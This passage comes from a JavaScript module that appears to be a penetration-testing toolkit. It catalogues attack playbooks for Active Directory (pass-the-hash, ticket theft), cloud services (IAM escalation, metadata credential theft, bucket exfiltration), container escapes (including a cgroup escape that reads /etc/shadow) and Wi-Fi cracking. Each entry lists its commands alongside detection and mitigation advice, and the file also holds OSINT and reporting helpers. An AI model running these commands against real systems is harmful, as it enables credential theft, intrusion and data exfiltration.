      "GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)",
      "GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)",
      "Replication traffic from non-DC IP addresses",
      "Microsoft Defender for Identity — DCSync detection",
    ],
    mitigation: [
      "Restrict Replicating Directory Changes permissions",
      "Monitor replication permissions and audit changes",
      "Use tiered administration model",
      "Deploy Microsoft Defender for Identity",
    ],
  },
  pass_the_hash: {
    name: "Pass-the-Hash",
    technique_id: "T1550.002",
    description: "Authenticate to a remote system using an NTLM hash without knowing the plaintext password",
    prerequisites: ["NTLM hash of a user account (from LSASS dump, SAM extract, etc.)", "NTLM authentication must be allowed (not Kerberos-only)"],
    commands: {
      execute: [
        "# Impacket — psexec with hash",
        "psexec.py domain.local/admin@10.10.10.5 -hashes :NTLM_HASH",
        "",
        "# Impacket — wmiexec",
        "wmiexec.py domain.local/admin@10.10.10.5 -hashes :NTLM_HASH",
        "",
        "# CrackMapExec — execute commands on multiple hosts",
        "crackmapexec smb 10.10.10.0/24 -u admin -H NTLM_HASH -x 'whoami'",
        "",
        "# Mimikatz — inject hash into current session",
        "sekurlsa::pth /user:admin /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe",
      ],
    },
    detection: [
      "Event ID 4624 — Logon Type 3 (Network) with NTLM authentication",
      "Event ID 4624 with NTLM where Kerberos would be expected",
      "Logon from unusual source for admin accounts",
      "Large number of NTLM authentications in short period",
    ],
    mitigation: [
      "Disable NTLM where possible (enforce Kerberos)",
      "Enable Credential Guard on Windows 10/11/Server 2016+",
      "Protected Users security group (prevents NTLM caching)",
      "LAPS for local administrator passwords",
      "Tiered administration model",
    ],
  },
  pass_the_ticket: {
    name: "Pass-the-Ticket",
    technique_id: "T1550.003",
    description: "Authenticate using stolen Kerberos tickets (TGT or TGS) without needing the password or hash",
    prerequisites: ["Stolen Kerberos ticket (from memory dump, ticket extraction)"],
    commands: {
      extract: [
        "# Mimikatz — export tickets from memory",
        "sekurlsa::tickets /export",
        "",
        "# Rubeus — dump all tickets",
        "Rubeus.exe dump /nowrap",
        "",
        "# Rubeus — dump specific ticket",
        "Rubeus.exe dump /luid:0x12345 /nowrap",
      ],
      inject: [
        "# Mimikatz — inject ticket",
        "kerberos::ptt ticket.kirbi",
        "",
        "# Rubeus — inject ticket",
        "Rubeus.exe ptt /ticket:BASE64_TICKET",
        "",
        "# Impacket — use ccache file",
        "export KRB5CCNAME=user.ccache",
        "psexec.py domain.local/admin@dc01 -k -no-pass",
      ],
    },
    detection: [
      "Event ID 4768/4769 — Kerberos operations from unusual sources",
      "Ticket reuse from different IP than original issuing",
      "TGT usage after the originating session has ended",
    ],
    mitigation: [
      "Credential Guard (prevents ticket extraction from LSASS)",
      "Short ticket lifetimes",
      "Protected Users group",
      "Monitor for anomalous ticket usage patterns",
    ],
  },
  overpass_the_hash: {
    name: "Overpass-the-Hash",
    technique_id: "T1550.002",
    description: "Use an NTLM hash to request a Kerberos TGT, allowing Kerberos-based lateral movement with just an NTLM hash",
    prerequisites: ["NTLM hash of a domain user"],
    commands: {
      execute: [
        "# Rubeus — request TGT with hash",
        "Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt",
        "",
        "# Rubeus — with AES key",
        "Rubeus.exe asktgt /user:admin /aes256:AES_KEY /ptt /opsec",
        "",
        "# Mimikatz",
        "sekurlsa::pth /user:admin /domain:domain.local /ntlm:NTLM_HASH /run:powershell.exe",
        "",
        "# Impacket",
        "getTGT.py domain.local/admin -hashes :NTLM_HASH",
        "export KRB5CCNAME=admin.ccache",
      ],
    },
    detection: [
      "Event ID 4768 — AS-REQ with RC4 encryption (when AES is expected)",
      "Unusual Kerberos ticket requests from workstations",
      "Encryption downgrade detection",
    ],
    mitigation: [
      "Enforce AES encryption for Kerberos",
      "Disable RC4 for Kerberos where possible",
      "Monitor for encryption downgrade attacks",
      "Credential Guard",
    ],
  },
};

// ═══════════════════════════════════════════════════════════════════════════════
// CLOUD ATTACK PATTERNS
// ═══════════════════════════════════════════════════════════════════════════════

export const CLOUD_ATTACKS = {
  aws: [
    {
      name: "IAM Privilege Escalation",
      description: "Exploit overly permissive IAM policies to escalate privileges",
      techniques: [
        { name: "CreateNewPolicyVersion", command: "aws iam create-policy-version --policy-arn arn:aws:iam::ACCTID:policy/ExistingPolicy --policy-document file://admin-policy.json --set-as-default", description: "Create a new version of an existing policy with admin permissions" },
        { name: "SetDefaultPolicyVersion", command: "aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCTID:policy/Target --version-id v2", description: "Set an older, more permissive policy version as default" },
        { name: "CreateAccessKey", command: "aws iam create-access-key --user-name admin-user", description: "Create access keys for a higher-privileged user" },
        { name: "AttachUserPolicy", command: "aws iam attach-user-policy --user-name attacker-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", description: "Attach AdministratorAccess policy to controlled user" },
        { name: "PassRole + Lambda", command: "aws lambda create-function --function-name backdoor --runtime python3.9 --role arn:aws:iam::ACCTID:role/AdminRole --handler index.handler --zip-file fileb://payload.zip", description: "Create a Lambda function with a higher-privileged role" },
        { name: "AssumeRole", command: "aws sts assume-role --role-arn arn:aws:iam::ACCTID:role/AdminRole --role-session-name pwned", description: "Assume a more privileged role if the trust policy allows it" },
      ],
      detection: ["CloudTrail: CreatePolicyVersion, AttachUserPolicy, AssumeRole events", "GuardDuty: PrivilegeEscalation findings", "AWS Config: IAM policy changes"],
      mitigation: ["Principle of least privilege", "IAM Access Analyzer", "Service control policies (SCPs)", "Regular IAM permission audits"],
    },
    {
      name: "S3 Data Exfiltration",
      description: "Access and exfiltrate data from misconfigured or accessible S3 buckets",
      techniques: [
        { name: "List all buckets", command: "aws s3 ls", description: "List all S3 buckets in the account" },
        { name: "List bucket contents", command: "aws s3 ls s3://target-bucket --recursive", description: "Recursively list all objects in a bucket" },
        { name: "Download all data", command: "aws s3 sync s3://target-bucket /tmp/exfil/", description: "Download entire bucket contents" },
        { name: "Check bucket policy", command: "aws s3api get-bucket-policy --bucket target-bucket", description: "Check for overly permissive bucket policies" },
        { name: "Check ACL", command: "aws s3api get-bucket-acl --bucket target-bucket", description: "Check for public ACL grants" },
      ],
      detection: ["CloudTrail: GetObject, ListBucket events (high volume)", "S3 access logging", "VPC Flow Logs for data transfer volume", "GuardDuty: UnauthorizedAccess findings"],
      mitigation: ["S3 Block Public Access", "Bucket policies with least privilege", "VPC endpoints for S3", "Macie for data classification"],
    },
    {
      name: "EC2 Instance Metadata Abuse (IMDS)",
      description: "Access the EC2 instance metadata service to steal IAM credentials",
      techniques: [
        { name: "IMDSv1 credential theft", command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", description: "Query IMDS for the IAM role name" },
        { name: "Get credentials", command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME", description: "Retrieve temporary IAM credentials for the instance role" },
        { name: "Get user data", command: "curl http://169.254.169.254/latest/user-data", description: "Check user-data for hardcoded secrets" },
        { name: "IMDSv2 (requires token)", command: "TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/", description: "IMDSv2 requires a session token first" },
      ],
      detection: ["Monitor for IMDS requests from applications that shouldn't need them", "GuardDuty: InstanceCredentialExfiltration", "CloudTrail: API calls from EC2 instance credentials outside the instance"],
      mitigation: ["Enforce IMDSv2 (require session tokens)", "Limit IAM role permissions on EC2 instances", "Use VPC endpoints instead of public internet for AWS API calls"],
    },
    {
      name: "Lambda Backdoor",
      description: "Create or modify Lambda functions for persistence and data access",
      techniques: [
        { name: "Create backdoor function", command: "aws lambda create-function --function-name maintenance-check --runtime python3.9 --role ROLE_ARN --handler index.handler --zip-file fileb://backdoor.zip", description: "Create a Lambda function that acts as a backdoor" },
        { name: "Add trigger", command: "aws events put-rule --name daily-check --schedule-expression 'rate(1 day)' && aws events put-targets --rule daily-check --targets Id=1,Arn=LAMBDA_ARN", description: "Schedule the backdoor to run daily" },
        { name: "Add API Gateway trigger", command: "aws apigateway create-rest-api --name backdoor-api", description: "Create an API endpoint that triggers the backdoor" },
      ],
      detection: ["CloudTrail: CreateFunction, UpdateFunctionCode events", "Monitor for Lambda functions with overly permissive roles", "Check for Lambda functions triggered by unusual sources"],
      mitigation: ["Code signing for Lambda functions", "Restrict Lambda creation permissions", "Monitor CloudTrail for function changes"],
    },
  ],
  azure: [
    {
      name: "Managed Identity Abuse",
      description: "Exploit Azure Managed Identities to access other Azure resources",
      techniques: [
        { name: "Get token from IMDS", command: "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true", description: "Request an access token from the Azure IMDS" },
        { name: "Use token", command: "az account get-access-token --resource https://management.azure.com", description: "Get access token via Azure CLI" },
        { name: "Access Key Vault", command: "az keyvault secret list --vault-name target-vault && az keyvault secret show --vault-name target-vault --name admin-password", description: "Access secrets stored in Azure Key Vault" },
      ],
      detection: ["Azure Activity Log: Token requests from VMs", "Monitor IMDS access patterns", "Key Vault diagnostic logs"],
      mitigation: ["Limit managed identity permissions", "Use system-assigned over user-assigned when possible", "Network restrictions on Key Vault"],
    },
    {
      name: "Storage Account Key Extraction",
      description: "Access Azure Storage account keys to gain full access to stored data",
      techniques: [
        { name: "List storage accounts", command: "az storage account list --query '[].{Name:name,RG:resourceGroup}'", description: "Enumerate all storage accounts" },
        { name: "Get account keys", command: "az storage account keys list --account-name targetaccount --resource-group target-rg", description: "Extract storage account access keys" },
        { name: "Access blobs", command: "az storage blob list --account-name targetaccount --account-key KEY --container-name data", description: "List and access blob containers" },
        { name: "Download all data", command: "az storage blob download-batch --account-name targetaccount --account-key KEY --source data --destination /tmp/exfil/", description: "Download entire container contents" },
      ],
      detection: ["Azure Activity Log: ListKeys operations", "Storage Analytics Logging", "Monitor for unusual data access patterns"],
      mitigation: ["Use Azure AD authentication instead of keys", "Rotate storage account keys regularly", "Use SAS tokens with minimal permissions", "Private endpoints for storage"],
    },
  ],
  gcp: [
    {
      name: "Service Account Impersonation",
      description: "Impersonate GCP service accounts to escalate privileges",
      techniques: [
        { name: "Get metadata token", command: "curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'", description: "Get access token from VM metadata" },
        { name: "List service accounts", command: "gcloud iam service-accounts list", description: "Enumerate service accounts" },
        { name: "Impersonate SA", command: "gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com", description: "Generate an access token for another service account" },
        { name: "Create SA key", command: "gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com", description: "Create a persistent key for a service account" },
      ],
      detection: ["Cloud Audit Logs: Service account key creation", "IAM policy changes", "Impersonation requests"],
      mitigation: ["Restrict iam.serviceAccounts.actAs permission", "Disable service account key creation", "Use Workload Identity Federation instead of keys"],
    },
    {
      name: "GCS Bucket Enumeration",
      description: "Discover and access misconfigured Google Cloud Storage buckets",
      techniques: [
        { name: "List buckets", command: "gsutil ls", description: "List all accessible GCS buckets" },
        { name: "Check permissions", command: "gsutil iam get gs://target-bucket", description: "Check bucket IAM permissions" },
        { name: "Download data", command: "gsutil -m cp -r gs://target-bucket /tmp/exfil/", description: "Download bucket contents" },
        { name: "Check public access", command: "gsutil ls -L gs://target-bucket | grep -i 'allUsers\\|allAuthenticatedUsers'", description: "Check for publicly accessible buckets" },
      ],
      detection: ["Cloud Audit Logs: storage.objects.list, storage.objects.get", "Bucket access logs", "VPC Flow Logs for data egress"],
      mitigation: ["Organization policy: uniformBucketLevelAccess", "Block public access at org level", "Data Loss Prevention API for classification"],
    },
  ],
};

// ═══════════════════════════════════════════════════════════════════════════════
// CONTAINER & SUPPLY CHAIN ATTACKS
// ═══════════════════════════════════════════════════════════════════════════════

export const CONTAINER_ESCAPE_TECHNIQUES = [
  {
    name: "Docker Socket Mount Escape",
    description: "Escape a container that has the Docker socket mounted (/var/run/docker.sock)",
    prerequisites: ["/var/run/docker.sock mounted in the container"],
    commands: [
      "# Check if Docker socket is mounted",
      "ls -la /var/run/docker.sock",
      "",
      "# Install Docker CLI in the container",
      "curl -fsSL https://get.docker.com | sh",
      "",
      "# Create a new privileged container with host filesystem",
      "docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host sh",
    ],
    impact: "Full host system access",
    mitigation: "Never mount Docker socket into containers. Use Docker-in-Docker or rootless Docker if needed.",
  },
  {
    name: "Privileged Container Escape",
    description: "Escape a container running with --privileged flag",
    prerequisites: ["Container running with --privileged or SYS_ADMIN capability"],
    commands: [
      "# Check capabilities",
      "capsh --print | grep cap_sys_admin",
      "",
      "# Mount host filesystem via cgroup release agent",
      "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x",
      "echo 1 > /tmp/cgrp/x/notify_on_release",
      "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
      "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent",
      "echo '#!/bin/sh' > /cmd && echo 'cat /etc/shadow > /tmp/cgrp/x/output' >> /cmd && chmod a+x /cmd",
      "sh -c 'echo \\$\\$ > /tmp/cgrp/x/cgroup.procs'",
      "cat /tmp/cgrp/x/output",
    ],
    impact: "Full host system access via cgroup escape",
    mitigation: "Never use --privileged. Use specific capabilities with --cap-add. Use seccomp profiles and AppArmor.",
  },
  {
    name: "Kernel Exploit Escape",
    description: "Exploit a kernel vulnerability to break out of the container namespace",
    prerequisites: ["Vulnerable host kernel", "Container shares host kernel"],
    commands: [
      "# Check kernel version",
      "uname -r",
      "",
      "# Known vulnerable kernels:",
      "# CVE-2022-0185 (fsconfig heap overflow, Linux 5.1+)",
      "# CVE-2022-0847 (Dirty Pipe, Linux 5.8+)",
      "# CVE-2021-22555 (Netfilter, Linux 2.6.19+)",
      "# CVE-2020-14386 (af_packet, Linux 4.6+)",
    ],
    impact: "Host root access via kernel exploitation",
    mitigation: "Keep host kernel updated. Use gVisor or Kata Containers for kernel isolation. Restrict container capabilities.",
  },
  {
    name: "Namespace Manipulation",
    description: "Escape by manipulating Linux namespaces from within a container",
    prerequisites: ["CAP_SYS_ADMIN or CAP_SYS_PTRACE capability"],
    commands: [
      "# Check if we can see host PID namespace",
      "ls /proc/1/root/",
      "",
      "# With CAP_SYS_PTRACE, attach to host PID 1",
      "nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
    ],
    impact: "Access to host namespaces (mount, network, PID)",
    mitigation: "Drop all unnecessary capabilities. Use user namespaces. Set seccomp profiles.",
  },
];

export const SUPPLY_CHAIN_ATTACKS = [
  {
    name: "Dependency Confusion",
    description: "Upload malicious packages to public registries that match private package names",
    technique: "Register a package on PyPI/npm/NuGet with the same name as an internal private package. When the build system resolves dependencies, it may pull the public (malicious) version.",
    targets: ["npm registry", "PyPI", "NuGet Gallery", "RubyGems", "Maven Central"],
    indicators: [
      "Package version numbers much higher than expected (to win version resolution)",
      "Newly registered packages matching internal naming conventions",
      "Install scripts that exfiltrate environment variables or .npmrc tokens",
    ],
    prevention: [
      "Pin exact package versions",
      "Use a private registry proxy (Artifactory, Nexus)",
      "Configure scoped registries for internal packages",
      "Use package-lock.json / requirements.txt with hashes",
    ],
  },
  {
    name: "Typosquatting",
    description: "Register packages with names similar to popular packages (typos, homoglyphs)",
    technique: "Register packages like 'reqeusts' (requests), 'colorsjs' (colors), 'lodahs' (lodash) that capture users who mistype package names.",
    examples: ["reqeusts → requests", "python-nmap → python-nmap", "crossenv → cross-env", "babelcli → babel-cli"],
    prevention: [
      "Use lockfiles with integrity hashes",
      "Code review package additions",
      "npm audit / pip audit / safety check",
      "Use organization scopes (@company/package)",
    ],
  },
  {
    name: "Build Pipeline Poisoning",
    description: "Compromise CI/CD pipelines to inject malicious code during the build process",
    technique: "Gain access to CI/CD system (Jenkins, GitHub Actions, GitLab CI) and modify build scripts to inject backdoors into artifacts. The resulting builds appear legitimate since they come from the official build system.",
    attack_vectors: [
      "Compromised CI/CD credentials",
      "Malicious pull request that modifies CI configuration",
      "Compromised build dependencies",
      "Poisoned base Docker images",
      "Self-hosted runner compromise",
    ],
    prevention: [
      "Code signing for all build artifacts",
      "SLSA framework compliance",
      "Immutable build environments",
      "Review CI configuration changes",
      "Separate build and deploy credentials",
      "Use ephemeral build runners",
    ],
  },
];

// ═══════════════════════════════════════════════════════════════════════════════
// WIRELESS ATTACK PLAYBOOK
// ═══════════════════════════════════════════════════════════════════════════════

export const WIRELESS_ATTACKS = [
  {
    name: "WPA2 Handshake Capture",
    description: "Capture the 4-way WPA2 handshake to crack offline",
    commands: [
      "# Put interface in monitor mode",
      "sudo airmon-ng start wlan0",
      "",
      "# Scan for target networks",
      "sudo airodump-ng wlan0mon",
      "",
      "# Capture handshake for specific BSSID",
      "sudo airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon",
      "",
      "# (In another terminal) Deauth a client to force re-handshake",
      "sudo aireplay-ng -0 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon",
      "",
      "# Crack the handshake",
      "aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt",
      "# Or with hashcat (faster, GPU)",
      "hcxpcapngtool capture-01.cap -o hash.hc22000",
      "hashcat -m 22000 hash.hc22000 wordlist.txt",
    ],
    mitigation: ["WPA3-SAE (dragonfly handshake)", "Long, complex WiFi passwords (16+ chars)", "802.1X Enterprise authentication"],
  },
  {
    name: "PMKID Attack",
    description: "Capture PMKID from the first EAPOL frame — no client deauth needed",
    commands: [
      "# Capture PMKID using hcxdumptool",
      "sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1",
      "",
      "# Convert to hashcat format",
      "hcxpcapngtool capture.pcapng -o hash.hc22000",
      "",
      "# Crack with hashcat",
      "hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule",
    ],
    mitigation: ["WPA3 (not vulnerable to PMKID)", "Strong passphrase (16+ characters)", "802.1X/RADIUS authentication"],
  },
  {
    name: "Evil Twin Attack",
    description: "Create a rogue access point mimicking the target network to capture credentials",
    commands: [
      "# Create evil twin with hostapd",
      "# hostapd.conf:",
      "# interface=wlan0",
      "# driver=nl80211",
      "# ssid=TargetSSID",
      "# channel=6",
      "# hw_mode=g",
      "",
      "# Start DHCP server",
      "sudo dnsmasq -i wlan0 --dhcp-range=192.168.1.2,192.168.1.100,12h",
      "",
      "# Start captive portal for credential harvesting",
      "# (Use a web server with a fake login page)",
      "",
      "# Deauth clients from real AP",
      "sudo aireplay-ng -0 0 -a REAL_BSSID wlan0mon",
    ],
    mitigation: ["802.1X authentication", "Server certificate validation", "VPN-always-on policy", "Evil twin detection (WIDS/WIPS)"],
  },
  {
    name: "KARMA Attack",
    description: "Respond to all WiFi probe requests to capture clients looking for known networks",
    commands: [
      "# Use hostapd-mana to respond to all probes",
      "# hostapd-mana.conf:",
      "# enable_mana=1",
      "# mana_loud=1",
      "",
      "# Or use Wifiphisher for automated attack",
      "sudo wifiphisher --essid FreeWiFi -p firmware-upgrade",
    ],
    mitigation: ["Disable auto-connect to remembered networks", "Clear saved WiFi networks regularly", "VPN for all WiFi connections"],
  },
];

// ═══════════════════════════════════════════════════════════════════════════════
// PHYSICAL SECURITY ASSESSMENT
// ═══════════════════════════════════════════════════════════════════════════════

export const PHYSICAL_SECURITY_CHECKLIST = {
  perimeter: [
    { item: "Fence/wall condition and height", rating: ["Absent", "Low (<6ft)", "Adequate (6-8ft)", "High security (>8ft, barbed wire)"] },
    { item: "Gate access control", rating: ["Open/unlocked", "Key lock only", "Badge access", "Guard + badge + camera"] },
    { item: "CCTV coverage of perimeter", rating: ["None", "Partial", "Full coverage", "Full + monitored + recorded"] },
    { item: "Lighting around perimeter", rating: ["Dark areas", "Partially lit", "Well lit", "Motion-activated + constant"] },
    { item: "Landscaping (hiding spots)", rating: ["Dense cover", "Some cover", "Minimal cover", "Clear lines of sight"] },
    { item: "Vehicle barriers", rating: ["None", "Speed bumps", "Bollards", "Active barriers + bollards"] },
    { item: "Signage (restricted area warnings)", rating: ["None", "Minimal", "Clear signage", "Prominent + legal warnings"] },
  ],
  building_access: [
    { item: "Main entrance security", rating: ["Open", "Receptionist only", "Badge + receptionist", "Guard + badge + mantrap"] },
    { item: "Badge/access card system", rating: ["None", "Proximity (125kHz, clonable)", "Smart card (13.56MHz)", "Multi-factor (badge + PIN/biometric)"] },
    { item: "Visitor management", rating: ["No process", "Sign-in sheet", "Electronic sign-in + badge", "Pre-registration + escort required"] },
    { item: "Tailgating prevention", rating: ["No measures", "Signage only", "Awareness training", "Mantraps/turnstiles"] },
    { item: "After-hours access control", rating: ["Unlocked", "Key lock", "Badge with time restrictions", "Guard + badge + logging"] },
    { item: "Loading dock security", rating: ["Open access", "Locked", "Badge + camera", "Guard + scheduled access only"] },
    { item: "Emergency exit monitoring", rating: ["No alarms", "Alarm only", "Alarm + camera", "Alarm + camera + delayed egress"] },
  ],
  internal: [
    { item: "Server room access", rating: ["Unlocked", "Key lock", "Badge access", "Biometric + badge + camera + logging"] },
    { item: "Network closet security", rating: ["Unlocked", "Key lock", "Badge access", "Badge + tamper detection"] },
    { item: "Clean desk policy", rating: ["No policy", "Policy exists, not enforced", "Periodic audits", "Actively enforced + spot checks"] },
    { item: "Screen lock policy", rating: ["No policy", "Manual only", "Auto-lock >15min", "Auto-lock <5min + enforced"] },
    { item: "USB port restrictions", rating: ["All enabled", "Policy but not enforced", "GPO disabled for most users", "Hardware disabled + monitored"] },
    { item: "Printer security", rating: ["Open trays", "Secure print available", "Secure print required", "Secure print + audit logging"] },
    { item: "Shredder availability", rating: ["None", "One per floor", "One per department", "Cross-cut at every workstation area"] },
    { item: "Wireless access points", rating: ["Open/WPA2-Personal", "WPA2-Enterprise", "WPA3-Enterprise", "WPA3-Enterprise + WIDS/WIPS"] },
  ],
  social_engineering_readiness: [
    { item: "Security awareness training", rating: ["None", "Annual", "Quarterly", "Continuous + phishing simulations"] },
    { item: "Incident reporting culture", rating: ["No process", "Process exists, rarely used", "Easy reporting, some usage", "Encouraged + rewarded + high usage"] },
    { item: "Challenge culture", rating: ["Nobody challenges", "Rare challenges", "Occasional challenges", "Consistent challenging of unknown visitors"] },
    { item: "Social media policy", rating: ["No policy", "General guidelines", "Specific restrictions", "Active monitoring + enforcement"] },
    { item: "Phone verification procedures", rating: ["None", "Informal", "Documented process", "Callback verification required"] },
  ],
};

// ═══════════════════════════════════════════════════════════════════════════════
// REPORTING TEMPLATE ENGINE
// ═══════════════════════════════════════════════════════════════════════════════

export function generateReportTemplate(type, findings = []) {
  const templates = {
    executive: {
      title: "Executive Summary — Penetration Test Report",
      sections: [
        { name: "Engagement Overview", content: "This report summarizes the findings from a {{type}} penetration test conducted between {{start_date}} and {{end_date}}. The assessment was performed by {{tester}} against {{target}} with the goal of identifying security vulnerabilities and assessing the organization's security posture." },
        { name: "Scope", content: "The following systems and services were in scope for this engagement:\n{{scope_items}}" },
        { name: "Key Findings Summary", content: `Critical: {{critical_count}} | High: {{high_count}} | Medium: {{medium_count}} | Low: {{low_count}} | Informational: {{info_count}}\n\nThe most significant findings include:\n{{top_findings}}` },
        { name: "Risk Assessment", content: "Based on our assessment, the overall security posture is rated as: {{overall_rating}}\n\n{{risk_narrative}}" },
        { name: "Recommendations", content: "We recommend the following immediate actions:\n{{priority_recommendations}}" },
        { name: "Conclusion", content: "{{conclusion}}" },
      ],
    },
    technical: {
      title: "Technical Findings Report",
      sections: [
        { name: "Methodology", content: "Testing was conducted using a combination of automated scanning and manual testing techniques, following the OWASP Testing Guide and PTES framework." },
        { name: "Tools Used", content: "{{tools_list}}" },
        { name: "Findings", findingsTemplate: {
          format: "### {{id}}. {{title}} ({{severity}})\n\n**CVSS Score:** {{cvss}}\n**MITRE ATT&CK:** {{mitre_id}}\n\n**Description:**\n{{description}}\n\n**Evidence:**\n{{evidence}}\n\n**Impact:**\n{{impact}}\n\n**Remediation:**\n{{remediation}}\n\n**References:**\n{{references}}\n\n---",
        }},
        { name: "Appendix A: Vulnerability Details", content: "{{detailed_vulns}}" },
        { name: "Appendix B: Raw Scan Output", content: "{{scan_output}}" },
      ],
    },
  };
  const template = templates[type] || templates.executive;
  return { ...template, findings, generatedAt: new Date().toISOString() };
}

// ═══════════════════════════════════════════════════════════════════════════════
// OSINT DATA AGGREGATOR
// ═══════════════════════════════════════════════════════════════════════════════

export const OSINT_SOURCES = {
  domain: [
    { name: "WHOIS Lookup", url: "https://whois.domaintools.com/{{domain}}", description: "Domain registration, nameservers, registrar" },
    { name: "DNS Records", query: "dig {{domain}} ANY", description: "All DNS records (A, AAAA, MX, TXT, NS, SOA)" },
    { name: "Certificate Transparency", url: "https://crt.sh/?q=%25.{{domain}}", description: "All SSL certificates issued for the domain and subdomains" },
    { name: "Wayback Machine", url: "https://web.archive.org/web/*/{{domain}}", description: "Historical website snapshots" },
    { name: "Shodan", url: "https://www.shodan.io/search?query=hostname:{{domain}}", description: "Internet-connected devices and services" },
    { name: "Censys", url: "https://search.censys.io/hosts?q={{domain}}", description: "Internet asset discovery" },
    { name: "SecurityTrails", url: "https://securitytrails.com/domain/{{domain}}", description: "Historical DNS data, subdomains" },
    { name: "VirusTotal", url: "https://www.virustotal.com/gui/domain/{{domain}}", description: "Domain reputation, related files and URLs" },
    { name: "Google Dorks", queries: [
      "site:{{domain}}", "site:{{domain}} filetype:pdf", "site:{{domain}} filetype:doc",
      "site:{{domain}} inurl:admin", "site:{{domain}} intitle:index.of",
      "site:{{domain}} intext:password", "site:{{domain}} ext:sql | ext:db | ext:log",
    ], description: "Google search operators for finding exposed content" },
  ],
  email: [
    { name: "Have I Been Pwned", url: "https://haveibeenpwned.com/account/{{email}}", description: "Check if email appears in data breaches" },
    { name: "Hunter.io", url: "https://hunter.io/email-verifier/{{email}}", description: "Email verification and associated domains" },
    { name: "EmailRep", url: "https://emailrep.io/{{email}}", description: "Email reputation and social media presence" },
  ],
  person: [
    { name: "LinkedIn", url: "https://www.linkedin.com/search/results/people/?keywords={{name}}", description: "Professional profile, connections, employment" },
    { name: "GitHub", url: "https://github.com/search?q={{name}}&type=users", description: "Code repositories, contributions, public keys" },
    { name: "Twitter/X", url: "https://twitter.com/search?q={{name}}", description: "Posts, connections, interests" },
  ],
  ip: [
    { name: "Shodan", url: "https://www.shodan.io/host/{{ip}}", description: "Open ports, services, vulnerabilities" },
    { name: "AbuseIPDB", url: "https://www.abuseipdb.com/check/{{ip}}", description: "IP abuse reports and reputation" },
    { name: "IPinfo", url: "https://ipinfo.io/{{ip}}", description: "IP geolocation, ASN, hostname" },
    { name: "GreyNoise", url: "https://viz.greynoise.io/ip/{{ip}}", description: "Internet scanner/bot identification" },
    { name: "VirusTotal", url: "https://www.virustotal.com/gui/ip-address/{{ip}}", description: "IP reputation, associated files and domains" },
  ],
};

export function buildOsintPlan(targetType, target) {
  const sources = OSINT_SOURCES[targetType] || [];
  return sources.map((s) => ({
    ...s,
    url: s.url ? s.url.replace(`{{${targetType}}}`, encodeURIComponent(target)).replace("{{name}}", encodeURIComponent(target)).replace("{{email}}", encodeURIComponent(target)).replace("{{domain}}", encodeURIComponent(target)).replace("{{ip}}", encodeURIComponent(target)) : undefined,
    queries: s.queries ? s.queries.map((q) => q.replace(`{{${targetType}}}`, target).replace("{{domain}}", target)) : undefined,
  }));
}

// ═══════════════════════════════════════════════════════════════════════════════
// ENGAGEMENT SCOPING CALCULATOR
// ═══════════════════════════════════════════════════════════════════════════════

export function calculateEngagementScope(params) {
  const {
    type = "web-app",
    targets = 1,
    depth = "standard",
    reporting = "standard",
    retesting = false,
  } = params;

  const baseHours = {
    "web-app": 40,
    "internal-network": 80,
    "external-network": 60,
    "cloud": 60,
    "active-directory": 80,
    "wireless": 24,
    "physical": 24,
    "social-engineering": 40,
    "red-team": 160,
  };

  const depthMultiplier = { "basic": 0.6, "standard": 1.0, "thorough": 1.4, "comprehensive": 1.8 };
  const reportMultiplier = { "minimal": 0.8, "standard": 1.0, "detailed": 1.2, "executive-plus-technical": 1.4 };

  let hours = (baseHours[type] || 40) * (depthMultiplier[depth] || 1.0) * (reportMultiplier[reporting] || 1.0);
  hours *= Math.max(1, targets * 0.7);
  if (retesting) hours += hours * 0.3;

  const rate = 200;
  const cost = hours * rate;
  const days = Math.ceil(hours / 8);
  const teamSize = days > 10 ? 2 : 1;

  return {
    estimatedHours: Math.round(hours),
    estimatedDays: days,
    estimatedCost: { low: Math.round(cost * 0.8), mid: Math.round(cost), high: Math.round(cost * 1.3) },
    teamSize,
    breakdown: {
      reconnaissance: Math.round(hours * 0.15),
      testing: Math.round(hours * 0.50),
      exploitation: Math.round(hours * 0.15),
      reporting: Math.round(hours * 0.20),
    },
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// CREDENTIAL FORMATTING
// ═══════════════════════════════════════════════════════════════════════════════

export function formatCredentialRequests(credentials, protocol, options = {}) {
  const { targetHost = "target.local", targetPort } = options;
  const formatted = [];

  for (const { username, password } of credentials) {
    const u = username || "", p = password || "";
    switch (protocol) {
      case "ssh":
        formatted.push(`ssh ${u}@${targetHost} -p ${targetPort || 22}`);
        break;
      case "rdp":
        formatted.push(`xfreerdp /v:${targetHost}:${targetPort || 3389} /u:${u} /p:'${p}'`);
        break;
      case "smb":
        formatted.push(`smbclient \\\\\\\\${targetHost}\\\\C$ -U '${u}%${p}'`);
        break;
      case "ftp":
